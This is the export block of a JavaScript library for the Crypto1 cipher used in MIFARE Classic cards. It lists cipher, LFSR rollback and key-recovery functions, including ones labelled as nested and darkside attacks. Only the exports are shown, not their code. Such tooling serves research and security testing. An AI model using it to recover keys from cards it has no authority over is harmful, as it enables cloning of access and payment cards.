   * Section 13 - Exports
   * ===================================================================== */

  var Crypto1 = {
    // constants
    LF_POLY_ODD: LF_POLY_ODD, LF_POLY_EVEN: LF_POLY_EVEN, FILTER_OUT: FILTER_OUT,
    // bit utils
    BIT: BIT, BEBIT: BEBIT, evenparity32: evenparity32, oddparity8: oddparity8,
    swapendian: swapendian, filter: filter,
    // key/state
    crypto1_create: crypto1_create, keyFromState: keyFromState, keyToHex: keyToHex,
    stateToKeyBig: stateToKeyBig, cloneState: cloneState, toKeyBig: toKeyBig,
    // cipher core
    crypto1_bit: crypto1_bit, crypto1_nibble: crypto1_nibble,
    crypto1_byte: crypto1_byte, crypto1_word: crypto1_word,
    // rollback
    lfsr_rollback_bit: lfsr_rollback_bit, lfsr_rollback_byte: lfsr_rollback_byte,
    lfsr_rollback_word: lfsr_rollback_word,
    // prng
    prng_successor: prng_successor, nonce_distance: nonce_distance,
    // recovery
    lfsr_recovery32: lfsr_recovery32, lfsr_recovery64: lfsr_recovery64,
    extend_table: extend_table, extend_table_simple: extend_table_simple,
    update_contribution: update_contribution,
    // attacks
    nestedRecover: nestedRecover, nestedParityOk: nestedParityOk,
    darksideRecover: darksideRecover, lfsr_prefix_ks: lfsr_prefix_ks,
    verifyKey: verifyKey,
    // test
    selfTest: selfTest
  };

  root.Crypto1 = Crypto1;
  if (typeof module !== 'undefined' && module.exports) module.exports = Crypto1;

})(typeof globalThis !== 'undefined' ? globalThis : (typeof self !== 'undefined' ? self : this));
